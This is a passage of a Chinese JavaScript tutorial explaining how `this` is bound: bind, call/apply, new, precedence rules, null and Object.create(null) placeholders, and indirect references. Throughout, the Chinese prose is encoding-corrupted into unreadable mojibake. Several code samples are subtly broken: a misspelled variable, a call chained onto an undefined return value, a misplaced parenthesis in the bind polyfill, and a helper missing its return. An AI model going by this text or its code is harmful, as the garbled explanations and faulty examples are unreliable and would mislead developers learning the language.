ç®€å•çš„è¾…åŠ©ç»‘å®šå‡½æ•°function bind(fn,obj)&#123; return function()&#123; return fn.apply(obj,arguments) &#125;&#125;var obj = &#123; a:2&#125;;var bar = bind(foo,obj);var b = bar(3);console.log(b); // 5 ç”±äºŽç¡¬ç»‘å®šæ˜¯ä¸€ç§éžå¸¸å¸¸ç”¨çš„æ¨¡å¼ï¼Œæ‰€æœ‰ ES5 æä¾›äº†å†…ç½®çš„æ–¹æ³• Funtion.prototype.bind,å®ƒçš„ç”¨æ³•å¦‚ä¸‹ 12345678910function foo(something)&#123; console.log(this.a,something); return this.a + something;&#125;var obj = &#123; a:2&#125;;var bar = foo.bind(obj);var b = bar(3);console.log(b); // 5 bind(â€¦)ä¼šè¿”å›žä¸€ä¸ªç¡¬ç¼–ç çš„æ–°å‡½æ•°ï¼Œå®ƒä¼šæŠŠä½ æŒ‡å®šçš„å‚æ•°è®¾ç½®ä¸º this çš„ä¸Šä¸‹æ–‡å¹¶è°ƒç”¨åŽŸå§‹å‡½æ•°ã€‚ 2.API è°ƒç”¨â€œä¸Šä¸‹æ–‡â€ ç¬¬ä¸‰æ–¹åº“çš„è®¸å¤šå‡½æ•°ï¼Œä»¥åŠ JavaScript è¯­è¨€å’Œå®¿ä¸»çŽ¯å¢ƒä¸­è®¸å¤šæ–°çš„å†…ç½®å‡½æ•°ï¼Œéƒ½æä¾›äº†ä¸€ä¸ªå¯é€‰çš„å‚æ•°ï¼Œé€šå¸¸è¢«ç§°ä¸º â€œä¸Šä¸‹æ–‡â€ï¼ˆcontextï¼‰ï¼Œå…¶ä½œç”¨å’Œ bind(..)ä¸€æ ·ï¼Œéƒ½æ˜¯ç¡®ä¿ä½ çš„å›žè°ƒå‡½æ•°ä½¿ç”¨æŒ‡å®šçš„ thisï¼Œä¸¾ä¸ªä¾‹å­ï¼š 123456789function foo(el)&#123; console.log(el,this.id);&#125;var obj = &#123; id:'awesome'&#125;;// è°ƒç”¨ foo(..)æ—¶æŠŠ this ç»‘å®šåˆ° obj[1,2,3].forEach(foo,obj);// 1 awesome 2 awesome 3 awesome è¿™äº›å‡½æ•°å®žé™…å°±æ˜¯é€šè¿‡ call æˆ–è€… apply å®žçŽ°äº†æ˜¾å¼ç»‘å®šï¼Œè¿™æ ·å°±å¯ä»¥å°‘äº›ä¸€äº›ä»£ç ã€‚ new ç»‘å®šè¿™æ˜¯ç¬¬å››æ¡è§„åˆ™ä¹Ÿæ˜¯æœ€åŽä¸€æ¡ this ç»‘å®šè§„åˆ™ã€‚åœ¨ä¼ ç»Ÿçš„é¢å‘ç±»çš„è¯­è¨€ä¸­ï¼Œâ€œæž„é€ å‡½æ•°â€æ˜¯ç±»ä¸­çš„ä¸€äº›ç‰¹æ®Šæ–¹æ³•ï¼Œä½¿ç”¨ new åˆå§‹åŒ–ç±»æ—¶ä¼šè°ƒç”¨ç±»ä¸­çš„æž„é€ å‡½æ•°ï¼Œé€šå¸¸çš„å½¢å¼æ˜¯è¿™æ ·çš„ï¼š 1something = new MyClass(..); JavaScript ä¹Ÿæœ‰ä¸€ä¸ª new æ“ä½œï¼Œä½¿ç”¨æ–¹æ³•çœ‹èµ·æ¥å’Œé‚£äº›é¢å‘ç±»çš„è¯­è¨€æ˜¯ä¸€æ ·çš„ï¼Œç»å¤§å¤šæ•°ä¸­å¼€å‘è€…éƒ½è®¤ä¸º JavaScript ä¸­çš„ new æœºåˆ¶ä¹Ÿå’Œé‚£äº›è¯­è¨€ä¸€æ ·çš„ï¼Œç„¶åŽå®žåˆ™ä¸åŒã€‚ é¦–å…ˆæˆ‘ä»¬é‡æ–°å®šä¹‰ä¸€ä¸ª JavaScript ä¸­çš„æž„é€ å‡½æ•°ï¼Œå®ƒåªæ˜¯ä¸€äº›ä½¿ç”¨ new æ“ä½œç¬¦æ—¶è¢«è°ƒç”¨çš„å‡½æ•°ã€‚å®ƒä»¬å¹¶ä¸ä¼šå±žäºŽå“ªä¸ªç±»ï¼Œä¹Ÿä¸ä¼šå®žä¾‹åŒ–ä¸€ä¸ªç±»ã€‚å®žé™…ä¸Šï¼Œå®ƒä»¬ç”šè‡³éƒ½ä¸èƒ½è¯´æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°ç±»åž‹ï¼Œå®ƒä»¬åªæ˜¯ è¢« new æ“ä½œç¬¦è°ƒç”¨çš„æ™®é€šå‡½æ•°è€Œå·²ã€‚ ä¸¾ä¾‹æ¥è¯´ï¼Œæ€è€ƒä¸€ä¸‹ Numberï¼ˆ..ï¼‰ä½œä¸ºæž„é€ å‡½æ•°æ—¶çš„è¡Œä¸ºï¼ŒES5.1 ä¸­è¿™æ ·æè¿°å®ƒ å½“ Number åœ¨ new è¡¨è¾¾å¼ä¸­è¢«è°ƒç”¨æ˜¯ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªæž„é€ å‡½æ•°ï¼šå®ƒä¼šåˆå§‹åŒ–æ–°åˆ›å»ºçš„å¯¹è±¡ æ‰€ä»¥ï¼ŒåŒ…æ‹¬å†…ç½®å¯¹è±¡å‡½æ•°ï¼ˆæ¯”å¦‚ Number(..)ï¼‰åœ¨å†…çš„æ‰€æœ‰å‡½æ•°éƒ½å¯ä»¥ç”¨ new æ¥è°ƒç”¨ï¼Œè¿™ç§å‡½æ•°è°ƒç”¨è¢«ç§°ä¸ºæž„é€ å‡½æ•°è°ƒç”¨ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªé‡è¦ä½†æ˜¯ç»†å¾®çš„åŒºåˆ«ï¼šå®žé™…ä¸Šå¹¶ä¸å­˜åœ¨æ‰€è°“çš„â€œæž„é€ å‡½æ•°â€ï¼Œåªæœ‰å¯¹å‡½æ•°çš„â€œæž„é€ è°ƒç”¨â€ã€‚ ä½¿ç”¨ new æ¥è°ƒç”¨å‡½æ•°ï¼Œæˆ–è€…è¯´å‘ç”Ÿæž„é€ å‡½æ•°è°ƒç”¨æ—¶ï¼Œä¼šè‡ªåŠ¨æ‰§è¡Œä¸‹é¢çš„æ“ä½œã€‚ åˆ›å»ºï¼ˆæž„é€ ï¼‰ä¸€ä¸ªå…¨æ–°çš„å¯¹è±¡ è¿™ä¸ªæ–°å¯¹è±¡ä¼šè¢«æ‰§è¡Œ [[prototype]] è¿žæŽ¥ è¿™ä¸ªæ–°å¯¹è±¡ä¼šç»‘å®šåˆ°å‡½æ•°è°ƒç”¨çš„ this å¦‚æžœå‡½æ•°æ²¡æœ‰è¿”å›žå…¶ä»–å¯¹è±¡ï¼Œé‚£ä¹ˆ new è¡¨è¾¾å¼ä¸­çš„å‡½æ•°ä¼šè‡ªåŠ¨è¿”å›žè¿™ä¸ªæ–°çš„å¯¹è±¡ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 12345function foo(a)&#123; this.a = a;&#125;var bar = new foo(2);console.log(bar.a); // 2 ä½¿ç”¨ new æ¥è°ƒç”¨ foo(..)ï¼Œæˆ‘ä»¬ä¼šæž„é€ ä¸€ä¸ªæ–°å¯¹è±¡å¹¶æŠŠå®ƒç»‘å®šåˆ° foo(..)è°ƒç”¨ä¸­çš„ thisä¸Šã€‚new æ˜¯æœ€åŽä¸€ç§å¯ä»¥å½±å“å‡½æ•°è°ƒç”¨æ—¶ this ç»‘å®šè¡Œä¸ºçš„æ–¹æ³•ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º new ç»‘å®šã€‚ ä¼˜å…ˆçº§çŽ°åœ¨æˆ‘ä»¬äº†è§£åˆ€å‡½æ•°è°ƒç”¨ä¸­ this ç»‘å®šçš„å››æ¡è§„åˆ™ï¼Œéœ€è¦åšçš„æ˜¯æ‰¾åˆ°å‡½æ•°çš„è°ƒç”¨ä½ç½®å¹¶åˆ¤æ–­åº”å½“åº”ç”¨é‚£æ¡è§„åˆ™ã€‚ä½†æ˜¯ï¼Œå¦‚æžœæŸä¸ªè°ƒç”¨ä½ç½®å¯ä»¥åº”ç”¨å¤šæ¡è§„åˆ™è¯¥æ€Žä¹ˆåŠžï¼Ÿä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜å°±å¿…é¡»ç»™è¿™äº›è§„åˆ™è®¾å®šä¸€ä¸ªä¼˜å…ˆçº§ã€‚ æ¯«æ— ä»¥ä¸ºï¼Œé»˜è®¤ç»‘å®šçš„ä¼˜å…ˆçº§æ˜¯è¿™å››æ¡è§„åˆ™é‡Œé¢æœ€ä½Žçš„ï¼Œéšå¼å’Œæ˜¾å¼ç»‘å®šå“ªä¸ªä¼˜å…ˆçº§æ›´é«˜ï¼Œæˆ‘ä»¬å¯ä»¥æ¥æµ‹è¯•ä¸€ä¸‹ï¼š 12345678910111213141516function foo()&#123; console.log(this.a);&#125;var obj1 = &#123; a:2, foo:foo&#125;var ojb2 = &#123; a:3, foo:foo&#125;obj1.foo(); // 2obj2.foo(); // 3obj1.foo.call(obj2); // 3obj2.foo.call(obj1); // 2 å¯ä»¥çœ‹åˆ°ï¼Œæ˜¾å¼ç»‘å®šä¼˜å…ˆçº§æ›´é«˜ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨åˆ¤æ–­æ—¶åº”å½“å…ˆè€ƒè™‘æ˜¯å¦å¯ä»¥å­˜åœ¨æ˜¾å¼ç»‘å®šã€‚ æˆ‘ä»¬éœ€è¦æžæ¸…æ¥š new ç»‘å®šå’Œéšå¼ç»‘å®šçš„ä¼˜å…ˆçº§è°é«˜è°ä½Žï¼š 1234567891011121314151617function foo(something)&#123; this.a = something;&#125;var obj1 = &#123; foo:foo&#125;var obj2 = &#123;&#125;;obj1.foo(2);console.log(obj1.a); // 2obj1.foo().call(obj2,3);console.log(obj2.a); // 3var bar = new obj1.foo(4); console.log(obj1.a); // 2console.log(bar.a); // 4 å¯ä»¥çœ‹åˆ° new ç»‘å®šæ¯”éšå¼ç»‘å®šä¼˜å…ˆçº§é«˜ï¼Œä½†æ˜¯ new ç»‘å®šå’Œ æ˜¾å¼ç»‘å®šè°çš„ä¼˜å…ˆçº§é«˜å‘¢ï¼Ÿ new å’Œ call/apply æ— æ³•ä¸€èµ·ä½¿ç”¨ï¼Œå› æ­¤æ— æ³•é€šè¿‡ new foo.call(obj1) æ¥ç›´æŽ¥è¿›è¡Œæµ‹è¯•ï¼Œä½†æ˜¯å¯ä»¥ç”¨ç¡¬ç»‘å®šæµ‹è¯•å®ƒä¿©çš„ä¼˜å…ˆçº§ å›žå¿†ä¸€ä¸‹ç¡¬ç»‘å®šæ˜¯æ€Žä¹ˆå·¥ä½œçš„ï¼ŒFunction.prototype.bind() ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„åŒ…è£…å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šå¿½ç•¥å®ƒå½“å‰çš„ this ç»‘å®šï¼ˆæ— è®ºç»‘å®šçš„å¯¹è±¡æ˜¯ä»€ä¹ˆï¼‰ï¼Œå¹¶æŠŠæˆ‘ä»¬æä¾›çš„å¯¹è±¡ç»‘å®šåˆ° this ä¸Šã€‚ è¿™æ ·çœ‹èµ·æ¥ç¡¬ç»‘å®šï¼ˆä¹Ÿæ˜¯æ˜¾å¼ç»‘å®šçš„ä¸€ç§ï¼‰ä¼¼ä¹Žæ¯” new ç»‘å®šçš„ä¼˜å…ˆçº§æ›´é«˜ï¼Œæ— æ³•ä½¿ç”¨ new æ¥æŽ§åˆ¶ this çš„ç»‘å®šã€‚è®©æˆ‘ä»¬éªŒè¯ä¸€ä¸‹ï¼š 1234567891011function foo(something)&#123; this.a = something;&#125;var obj1 = &#123;&#125;;var bar = foo.bind(obj1);bar(2);console.log(obj1.a); // 2var baz = new bar(3);console.log(obj1.a); // 2console.log(baz.a); // 3 å¯ä»¥çœ‹åˆ°ï¼Œbar è¢«ç¡¬ç»‘å®šåˆ°obj1ä¸Šï¼Œä½†æ˜¯ new bar(3) å¹¶æ²¡æœ‰åƒæˆ‘ä»¬é¢„è®¡çš„é‚£æ ·æŠŠ obj1.a ä¿®æ”¹ä¸º 3.ç›¸åï¼Œnew ä¿®æ”¹äº†ç¡¬ç»‘å®šï¼ˆåˆ° obj1ï¼‰è°ƒç”¨ bar(..)ä¸­çš„ this.å› ä¸ºä½¿ç”¨äº† new ç»‘å®šï¼Œæˆ‘ä»¬å¾—åˆ°ä¸€ä¸ªåå­—ä¸º baz çš„æ–°å¯¹è±¡ï¼Œå¹¶ä¸” baz.a çš„å€¼æ˜¯3. å†æ¥çœ‹çœ‹çœ‹ä¹‹å‰ä»‹ç»çš„â€œè£¸â€è¾…åŠ©å‡½æ•° bind: 12345function bind(fn,obj)&#123; return function()&#123; fn.apply(obj,arguments); &#125;&#125; åœ¨è¾…åŠ©å‡½æ•°ä¸­ new æ“ä½œç¬¦çš„è°ƒç”¨æ— æ³•ä¿®æ”¹ this ç»‘å®šï¼Œä½†æ˜¯åœ¨ä¸Šä¸€ä¸ªä¾‹å­ä¸­ new çš„ç¡®ä¿®æ”¹äº† this ç»‘å®šã€‚å®žé™…ä¸Šï¼ŒES5 ä¸­å†…ç½®çš„ Function.prototype.bind(..)æ›´åŠ å¤æ‚ï¼Œä¸‹é¢æ˜¯ MDN æä¾›çš„ä¸€ç§ bind(..)çš„å®žçŽ°ï¼Œä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬é˜…è¯»ï¼Œä½œè€…è¿›è¡Œäº†æŽ’ç‰ˆï¼š 1234567891011121314151617181920if(!Function.prototype.bind)&#123; Function.prototype.bind = function(oThis)&#123; if(typeof this !== "function")&#123; // ä¸Ž ES5 æœ€æŽ¥è¿‘çš„å†…éƒ¨çš„ IsCallbale å‡½æ•° throw new TypeError( "Function.prototype.bind -what is trying to be bound is not callable" ) &#125; var aArgs = Array.prototype.slice.call(arguments,1), fToBind = this, fNOP = function()&#123;&#125;, fBound = function()&#123; return fToBind.apply(this instanceof fNOP &amp;&amp; oThis ? this : oThis), aArgs.concat(Array.prototype.slice.call(arguments)); &#125; fNOP.prototype = this.prototype; fBound.prototype = new fNOP(); return fBound; &#125;&#125; è¿™ç§ bind(â€¦) æ˜¯ä¸€ç§ polyfill ä»£ç ï¼ˆä¸»è¦ç”¨äºŽæ—§æµè§ˆå™¨çš„å…¼å®¹ï¼Œæ¯”å¦‚è¯´åœ¨æ—§æµè§ˆå™¨ä¸­ä½¿ç”¨æ²¡æœ‰å†…ç½® bind å‡½æ•°ï¼‰ï¼Œå¯¹äºŽ new ä½¿ç”¨çš„ç¡¬ç»‘å®šå‡½æ•°æ¥è¯´ï¼Œè¿™æ®µ polyfill ä»£ç åœ¨æ—§æµè§ˆå™¨å’Œ ES5 å†…ç½®çš„ bindï¼ˆ..ï¼‰å‡½æ•°å¹¶ä¸å®Œå…¨ç›¸åŒï¼ˆåŽé¢ä»‹ç»ä¸ºä»€ä¹ˆè¦åœ¨ new ä¸­ä½¿ç”¨ç¡¬ç»‘å®šå‡½æ•°ï¼‰ã€‚ç”±äºŽ polyfill å¹¶ä¸æ˜¯å†…ç½®å‡½æ•°ï¼Œæ‰€ä»¥æ— æ³•åˆ›å»ºä¸€ä¸ªä¸åŒ…å« .prototype çš„å‡½æ•°ã€‚å› æ­¤ä¼šæœ‰ä¸€äº›å‰¯ä½œç”¨ã€‚å¦‚æžœä½ è¦åœ¨ new ä¸­ä½¿ç”¨ç¡¬ç»‘å®šå‡½æ•°å¹¶ä¸”ä¾èµ– polyfill ä»£ç çš„è¯ï¼Œä¸€å®šè¦éžå¸¸å°å¿ƒã€‚ ä¸‹é¢æ˜¯ new ä¿®æ”¹ this çš„ç›¸å…³ä»£ç ï¼š 1234this instanceof fNOP &amp;&amp; oThis ? this : oThis// ä»¥åŠfNOP.prototype = this.prototype;fBound.prototype = new fNOP(); ç®€å•æ¥è¯´ï¼Œè¿™æ®µä»£ç ä¼šåˆ¤æ–­ç¡¬ç»‘å®šå‡½æ•°æ˜¯å¦è¢« new è°ƒç”¨ï¼Œå¦‚æžœæ˜¯çš„è¯å°±æ˜¯ç”¨æ–°åˆ›å»ºçš„ this æ¥æ›¿æ¢ç¡¬ç»‘å®š çš„this. é‚£ä¹ˆä¸ºä»€ä¹ˆè¦åœ¨ new ä¸­ä½¿ç”¨ç¡¬ç»‘å®šå‡½æ•°å‘¢ï¼Ÿç›´æŽ¥ä½¿ç”¨æ™®é€šå‡½æ•°ä¸æ˜¯æ›´ç®€å•ï¼Ÿ ä¹‹æ‰€ä»¥è¦åœ¨ new ä¸­ä½¿ç”¨ç¡¬ç»‘å®šå‡½æ•°ï¼Œä¸»è¦ç›®çš„æ˜¯é¢„å…ˆè®¾ç½®å‡½æ•°çš„ä¸€äº›å‚æ•°ï¼Œè¿™æ ·åœ¨ä½¿ç”¨ new åˆå§‹åŒ–æ—¶å°±å¯ä»¥åªä¼ å…¥å…¶ä½™çš„å‚æ•°ã€‚bindï¼ˆ..ï¼‰åŠŸèƒ½ä¹‹ä¸€å°±æ˜¯å¯ä»¥æŠŠé™¤äº†ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°ç”¨äºŽç»‘å®š thisï¼‰ä¹‹å¤–çš„å…¶ä»–å‚æ•°éƒ½ä¼ ç»™ä¸‹ä¸€å±‚çš„å‡½æ•°ï¼ˆè¿™ç§æŠ€æœ¯ç§°ä¸ºâ€œéƒ¨åˆ†åº”ç”¨â€ï¼Œæ˜¯â€œæŸ¯é‡ŒåŒ–â€çš„ä¸€ç§ã€‚å…³äºŽæŸ¯é‡ŒåŒ–æ›´å¤šçš„å†…å®¹ï¼Œå¯ä»¥æŸ¥çœ‹è¿™é‡Œï¼‰ä¸¾ä¾‹è¯´æ˜Žï¼š 1234567function foo(p1,p2)&#123; this.val = p1 + p2;&#125;// ä¹‹æ‰€ä»¥ä½¿ç”¨ null æ˜¯å› ä¸ºè¿™ä¸ªä¾‹å­ä¸­æˆ‘ä»¬å¹¶ä¸å…³å¿ƒç¡¬ç»‘å®šçš„ this æ˜¯ä»€ä¹ˆï¼Œåæ­£ä½¿ç”¨ new æ—¶ï¼Œthisä¼šè¢«ä¿®æ”¹var bar = foo.bind(null,"p1");var baz = new bar("p2");baz.val; åˆ¤æ–­ thisçŽ°åœ¨æˆ‘ä»¬å¯ä»¥æ ¹æ®ä¼˜å…ˆçº§æ¥åˆ¤æ–­å‡½æ•°åœ¨æŸä¸ªè°ƒç”¨ä½ç½®åº”ç”¨çš„æ˜¯å“ªäº›è§„åˆ™ï¼Œå¯ä»¥æŒ‰ç…§ä¸‹é¢çš„é¡ºåºæ¥è¿›è¡Œåˆ¤æ–­ï¼š å‡½æ•°æ˜¯å¦åœ¨ new è°ƒç”¨ï¼ˆnew ç»‘å®šï¼‰ï¼Ÿå¦‚æžœæ˜¯çš„è¯ this ç»‘å®š çš„æ˜¯æ–°åˆ›å»ºçš„å¯¹è±¡ã€‚ å‡½æ•°æ˜¯å¦é€šè¿‡ call,apply(æ˜¾ç¤ºç»‘å®š)æˆ–è€…ç¡¬ç»‘å®šè°ƒç”¨ï¼Ÿå¦‚æžœæ˜¯çš„è¯ï¼Œthisç»‘å®šçš„æ˜¯æŒ‡å®šçš„å¯¹è±¡ var bar = foo.call(obj2); å‡½æ•°æ˜¯å¦åœ¨æŸä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ä¸­è°ƒç”¨ï¼ˆéšå¼ç»‘å®šï¼‰ï¼Ÿå¦‚æžœæ˜¯çš„è¯ï¼Œthis ç»‘å®šçš„æ˜¯é‚£ä¸ªä¸Šä¸‹æ–‡çš„å¯¹è±¡ var bar = obj1.foo(); å¦‚æžœéƒ½ä¸æ˜¯çš„è¯ï¼Œä½¿ç”¨é»˜è®¤ç»‘å®šï¼Œå¦‚æžœåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œå°±ç»‘å®šåˆ° undefined ï¼Œå¦åˆ™ç»‘å®šåˆ°å…¨å±€å¯¹è±¡ã€‚ var bar = foo; å¯¹äºŽæ­£å¸¸å‡½æ•°æ¥è¯´ï¼Œç†è§£äº†è¿™äº›çŸ¥è¯†å°±å¯ä»¥æ˜Žç™½äº† this çš„ç»‘å®šåŽŸç†äº†ï¼Œä¸è¿‡ä¹Ÿæœ‰ä¾‹å¤–ã€‚ ç»‘å®šä¾‹å¤–è§„åˆ™æ€»æœ‰ä¾‹å¤–ï¼Œè¿™é‡Œä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚åœ¨æŸäº›åº”å½“åº”ç”¨å…¶ä»–ç»‘å®šè§„åˆ™æ—¶ï¼Œå®žé™…ä¸Šåº”ç”¨çš„æ˜¯é»˜è®¤ç»‘å®šè§„åˆ™ è¢«å¿½ç•¥çš„ thiså¦‚æžœä½ æŠŠ null æˆ–è€… undefined ä½œä¸º this çš„ç»‘å®šå¯¹è±¡ä¼ å…¥ callã€apply æˆ–è€… bind ï¼Œè¿™äº›å€¼åœ¨è°ƒç”¨æ—¶ä¼šè¢«å¿½ç•¥ï¼Œå®žé™…åº”ç”¨åˆ°æ˜¯é»˜è®¤çš„ç»‘å®šè§„åˆ™ï¼š 12345function foo()&#123; console.log(this.a);&#125;var a = 2;foo.call(null); // 2 é‚£ä¹ˆä»€ä¹ˆæƒ…å†µä¸‹ä¼šä¼ å…¥ nullå‘¢ï¼Ÿ ä¸€ç§éžå¸¸å¸¸è§çš„åšæ³•æ˜¯ä½¿ç”¨ apply(..)æ¥å±•å¼€ä¸€ä¸ªæ•°ç»„ï¼Œå¹¶ä¸”å½“åšå‚æ•°ä¼ å…¥ä¸€ä¸ªå‡½æ•°ã€‚ç±»ä¼¼åœ°ï¼Œbind(..)å¯ä»¥å¯¹å‚æ•°è¿›è¡ŒæŸ¯é‡ŒåŒ–ï¼ˆé¢„å…ˆè®¾ç½®ä¸€äº›å‚æ•°ï¼‰ï¼Œè¿™ç§æ–¹æ³•æœ‰æ—¶éžå¸¸æœ‰æ•ˆã€‚ 12345678function foo(a,b)&#123; console.log("a:"+a+",b:"+b);&#125;// æŠŠæ•°ç»„å±•å¼€æˆå‚æ•°foo.apply(null,[2,3]); // a:2,b:3// ä½¿ç”¨ bind(..)è¿›è¡ŒæŸ¯é‡ŒåŒ–var bar = foo.bind(null,2);bar(3); // a:2,b:3 è¿™ä¸¤ç§æ–¹æ³•éƒ½éœ€è¦ä¼ å…¥ä¸€ä¸ªå‚æ•°ä½œä¸º this çš„ç»‘å®šå¯¹è±¡ï¼Œå¦‚æžœå‡½æ•°å¹¶ä¸å…³å¿ƒ this çš„è¯ï¼Œä½ ä»ç„¶éœ€è¦ä¼ å…¥ä¸€ä¸ªå ä½ç¬¦ï¼Œè¿™æ—¶ null å¯èƒ½æ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ï¼Œå°±åƒä»£ç ä¸­æ‰€ç¤ºé‚£æ ·ã€‚ ES6 ä¸­ï¼Œå¯ä»¥ç”¨ Spread å±•å¼€ç¬¦ï¼ˆâ€¦ï¼‰æ›¿ä»£ apply(..)æ¥å±•å¼€æ•°ç»„ã€‚foo(â€¦[1,2]) å’Œ foo(1,2)æ˜¯ä¸€æ ·çš„ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…ä¸å¿…è¦çš„ this ç»‘å®šã€‚å¯æƒœåœ¨ ES6 ä¸­æ²¡æœ‰æŸ¯é‡ŒåŒ–çš„å…ˆå…³è¯­æ³•ï¼Œè¿˜æ˜¯è¦ä½¿ç”¨ bind(â€¦) ç„¶è€Œæ€»æ˜¯ä½¿ç”¨ nullæ¥å¿½ç•¥ this ç»‘å®šå¯èƒ½äº§ç”Ÿä¸€äº›å‰¯ä½œç”¨ï¼Œå¦‚æžœæŸä¸ªå‡½æ•°ç¡®å®žä½¿ç”¨äº† this (æ¯”å¦‚ ç¬¬ä¸‰æ–¹åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°)ï¼Œé‚£é»˜è®¤ç»‘å®šè§„åˆ™å°±ä¼š this ç»‘å®šåˆ°å…¨å±€å¯¹è±¡ï¼ˆåœ¨æµè§ˆå™¨ä¸­è¿™ä¸ªå¯¹è±¡æ˜¯ windowï¼‰ï¼Œè¿™å°†å¯¼è‡´ä¸å¯é¢„è®¡çš„åŽæžœï¼ˆæ¯”å¦‚ä¿®å…¨å±€å¯¹è±¡ï¼‰ã€‚ æ˜¾è€Œæ˜“è§ï¼Œè¿™ç§æ–¹å¼å¯èƒ½ä¼šå¯¼è‡´è®¸å¤šéš¾ä»¥åˆ†æžå’Œè¿½è¸ªçš„ bug. æ›´å®‰å…¨çš„ this ä¸€ç§â€œæ›´å®‰å…¨â€çš„åšæ³•æ˜¯ä¼ å…¥ä¸€ä¸ªç‰¹æ®Šçš„å¯¹è±¡ï¼ŒæŠŠ this ç»‘å®šåˆ°è¿™ä¸ªå¯¹è±¡ä¸ä¼šå¯¹ä½ çš„ç¨‹åºäº§ç”Ÿä»»ä½•å‰¯ä½œç”¨ï¼Œå°±åƒç½‘ç»œï¼ˆä»¥åŠå†›é˜Ÿï¼‰ä¸€æ ·ã€‚æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªâ€œDMZâ€(demilitarized zone,éžå†›äº‹åŒº)å¯¹è±¡â€”â€”å®ƒå°±æ˜¯ä¸€ä¸ªç©ºçš„éžå§”æ‰˜çš„å¯¹è±¡ï¼ˆå§”æ‰˜åŽé¢ä¼šè®²åˆ°ï¼‰ã€‚ å¦‚æžœæˆ‘ä»¬åœ¨å¿½ç•¥ this ç»‘å®šæ—¶æ€»æ˜¯ä¼ å…¥ä¸€ä¸ªDMZ å¯¹è±¡ï¼Œé‚£å°±ä¸ç”¨æ‹…å¿ƒäº†ï¼Œå› ä¸ºä»»ä½•å¯¹äºŽ this çš„ä½¿ç”¨éƒ½ä¼šè¢«é™åˆ¶åœ¨è¿™ä¸ªç©ºå¯¹è±¡ä¸­ï¼Œä¸ä¼šå¯¹å…¨å±€å¯¹è±¡äº§ç”Ÿä»»ä½•å½±å“ã€‚ ç”±äºŽè¿™ä¸ªå¯¹è±¡æ˜¯ä¸€ä¸ªç©ºå¯¹è±¡ï¼Œå¯ä»¥ç”¨è‡ªå·±å–œæ¬¢çš„å˜é‡åæ¥è¡¨ç¤ºã€‚ä¸è¿‡å»ºè®®ä½¿ç”¨æ¯”è¾ƒç‰¹æ®Šçš„ã€‚ åœ¨ JavaScript ä¸­åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡æœ€ç®€å•çš„æ–¹å¼éƒ½æ˜¯ Object.creact(null).Object.create(null)å’Œ{}å¾ˆåƒï¼Œä½†æ˜¯å¹¶ä¸ä¼šåˆ›å»º Object.prototype è¿™ä¸ªå§”æ‰˜ï¼Œæ‰€ä»¥å®ƒæ¯”{}è¿˜ç©ºã€‚ 12345678910function foo(a,b)&#123; console.log("a:"+a+",b:"+b);&#125;// æˆ‘ä»¬çš„ DMZ ç©ºå¯¹è±¡var âˆ… = Object.create(null);// æŠŠæ•°ç»„å±•å¼€æˆå‚æ•°foo.apply(âˆ… ,[2,3]); // a:2,b:3// ä½¿ç”¨ bind(..)è¿›è¡ŒæŸ¯é‡ŒåŒ–var bar = foo.bind(âˆ… ,2);bar(3); // a:2,b:3 ä½¿ç”¨å˜é‡å âˆ… ä¸ä»…è®©å‡½æ•°æ›´åŠ å®‰å…¨ï¼Œè¿˜å¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§ï¼Œå› ä¸º âˆ… è¡¨ç¤ºâ€æˆ‘å¸Œæœ›this æ˜¯ç©ºçš„â€œï¼Œè¿™æ¯”null çš„å«ä¹‰æ›´åŠ æ¸…æ¥šã€‚ é—´æŽ¥å¼•ç”¨å¦ä¸€ä¸ªéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰å¯èƒ½ï¼ˆæ— æ„æˆ–è€…æœ‰æ„åœ°ï¼‰åˆ›å»ºä¸€ä¸ªå‡½æ•°çš„â€œé—´æŽ¥å¼•ç”¨â€ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè°ƒç”¨è¿™ä¸ªå‡½æ•°ä¼šåº”ç”¨é»˜è®¤ç»‘å®šè§„åˆ™ã€‚ é—´æŽ¥å¼•ç”¨æœ€å®¹æ˜“åœ¨èµ‹å€¼æ—¶å‘ç”Ÿï¼š 12345678function foo()&#123; console.log(this.a);&#125;var a = 2;var o = &#123; a: 3, foo:foo &#125;var p = &#123; a: 4 &#125;;o.foo(); // 3(p.foo = o.foo)(); // 2 èµ‹å€¼è¡¨è¾¾å¼ p.foo = o.foo çš„è¿”å›žå€¼æ˜¯ç›®æ ‡å‡½æ•°çš„å¼•ç”¨ï¼Œå› æ­¤è°ƒç”¨ä½ç½®æ˜¯ foo() è€Œä¸æ˜¯ p.foo æˆ–è€… o.foo æ ¹æ®ä¹‹å‰è¯´è¿‡çš„ï¼Œè¿™é‡Œä¼šåº”ç”¨é»˜è®¤ç»‘å®šã€‚ å¯¹äºŽé»˜è®¤ç»‘å®šæ¥è¯´ï¼Œå†³å®š this ç»‘å®šå¯¹è±¡çš„å¹¶ä¸æ˜¯è°ƒç”¨ä½ç½®æ˜¯å¦å¤„äºŽ ä¸¥æ ¼æ¨¡å¼ï¼Œè€Œæ˜¯å‡½æ•°ä½“æ˜¯å¦å¤„äºŽä¸¥æ ¼æ¨¡å¼ã€‚å¦‚æžœå‡½æ•°ä½“å¤„äºŽä¸¥æ ¼æ¨¡å¼ï¼Œthis ä¼šè¢«ç»‘å®šåˆ° undefined ï¼Œå¦åˆ™ this ä¼šè¢«ç»‘å®šåˆ°å…¨å±€å¯¹è±¡ã€‚ 